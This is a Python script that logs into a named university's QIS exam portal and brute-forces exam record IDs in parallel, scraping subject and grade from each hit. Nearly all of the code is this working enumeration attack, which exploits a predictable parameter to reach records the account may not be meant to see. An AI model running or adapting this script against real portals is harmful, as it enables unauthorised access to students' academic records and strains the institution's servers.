#!/usr/bin/env python

from gevent import monkey; monkey.patch_all()
from gevent.pool import Pool
from gevent.queue import Queue
from pyquery import PyQuery as pq
from urlparse import parse_qs
from time import sleep
import requests
import os.path, ConfigParser


config = ConfigParser.ConfigParser()

if os.path.isfile('config.ini'):
  config.read('config.ini')

  auth = {
    'asdf': config.get('CREDENTIALS', 'user'),
    'fdsa': config.get('CREDENTIALS', 'pw'),
    'submit': 'Anmelden'
  }

  ids = {
    'kontoOnTop': config.get('IDS', 'konto_on_top'),
    'konto': config.get('IDS', 'konto')
  }

  startId = int(config.get('BRUTEFORCE', 'start_id'))
  rng = int(config.get('BRUTEFORCE', 'range'))
  pa = int(config.get('BRUTEFORCE', 'parallel_auths'))
  pr = int(config.get('BRUTEFORCE', 'parallel_requests'))
  slt = float(config.get('BRUTEFORCE', 'sleep'))

  url = 'https://qis.fh-rosenheim.de/qisserver/'
  auth_url = url + 'rds?state=user&type=1&category=auth.login'
  link_url = url + 'rds?state=change&type=1&moduleParameter=studyPOSMenu&next=menu.vm&xml=menu'
  content_url = url + 'rds?state=notenspiegelStudent&next=list.vm&nextdir=qispos/notenspiegel/student' + \
      '&createInfos=Y&struct=abschluss&nodeID=auswahlBaum|abschluss:abschl=84,stgnr=1,stg=INF,pversion=20122' + \
      '|studiengang:stg=INF|kontoOnTop:labnrzu=%(kontoOnTop)s|konto:labnrzu=%(konto)s' % ids


queue = Queue(pa)
pool = Pool(pr)


def init_queue():
  for r in pool.imap_unordered(lambda _: auth_asi(), range(pa)):
    queue.put(r)


def auth_asi():
  s = requests.session()
  s.post(auth_url, data=auth)
  r = s.get(link_url)
  doc = pq(r.text)
  asi = parse_qs(doc('a[href*="&asi="]').attr('href'))['asi'][0]
  return {'session': s, 'asi': asi}


def bruteforce(i):
  auth = queue.get()
  queue.put(auth)

  s = auth['session']
  asi = auth['asi']

  param = '|pruefung:labnr=%s' % i

  r = s.get(content_url + param + '&asi=' + asi)
  doc = pq(r.text)

  subject = doc('table tr td.tabelle1:nth-child(2)').text()
  score = doc('table tr td.tabelle1:nth-child(4)').text()

  if subject and score:
    print(subject + ' - ' + score)


def check_config():
  if not os.path.isfile('config.ini'):
    config.add_section('CREDENTIALS')
    config.add_section('IDS')
    config.add_section('BRUTEFORCE')
    config.set('CREDENTIALS', 'user', 'username')
    config.set('CREDENTIALS', 'pw', 'passsword')
    config.set('IDS', 'konto_on_top', '')
    config.set('IDS', 'konto', '')
    config.set('BRUTEFORCE', 'start_id', '1873537')
    config.set('BRUTEFORCE', 'range', '1000')
    config.set('BRUTEFORCE', 'parallel_auths', '5')
    config.set('BRUTEFORCE', 'parallel_requests', '10')
    config.set('BRUTEFORCE', 'sleep', '0.05')
    with open('config.ini', 'w') as configfile:
      config.write(configfile)
    print('Creating config.ini! Please setup and rerun!')
    return False
  return True


if __name__ == "__main__":
  if check_config():
    init_queue()
    for i in range(startId, startId + rng):
      sleep(slt)
      pool.spawn(bruteforce, i)
